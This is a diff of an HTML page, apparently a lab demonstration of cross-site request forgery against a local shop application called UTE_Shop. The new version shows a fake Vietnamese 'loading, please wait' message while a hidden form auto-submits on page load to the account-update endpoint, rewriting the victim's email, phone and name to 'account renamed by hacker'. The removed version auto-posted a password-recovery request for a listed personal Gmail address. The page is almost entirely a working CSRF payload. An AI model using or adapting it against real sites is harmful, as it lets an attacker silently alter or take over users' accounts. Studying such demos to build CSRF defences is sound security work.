@@ -1,12 +1,43 @@
 <!DOCTYPE html>
-<html>
-  <body>
-    <h2>Đang tấn công CSRF - gửi mã xác nhận khôi phục mật khẩu</h2>
-    <form id="csrfForm" action="https://localhost:8443/UTE_Shop/forgotPassword" method="POST">
-      <input type="hidden" name="email" value="nguyenduydat.1300@gmail.com">
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack Demo</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+        .message {
+            text-align: center;
+            font-size: 24px;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <div class="message">
+        Đang tải nội dung... Vui lòng đợi!
+    </div>
+
+    <!-- Biểu mẫu tự động gửi để thực hiện tấn công CSRF -->
+    <form id="csrfForm" action="https://localhost:8443/UTE_Shop/account/updateAccount" method="POST" style="display: none;">
+        <input type="hidden" name="email" value="duydat@gmail.com">
+        <input type="hidden" name="fullName" value="Tài Khoản Đã bị Hacker đổi tên">
+        <input type="hidden" name="phone" value="0123456789">
     </form>
+
     <script>
-      document.getElementById('csrfForm').submit();
+        // Tự động gửi biểu mẫu ngay khi trang được tải
+        window.onload = function() {
+            document.getElementById("csrfForm").submit();
+        };
     </script>
-  </body>
+</body>
 </html>
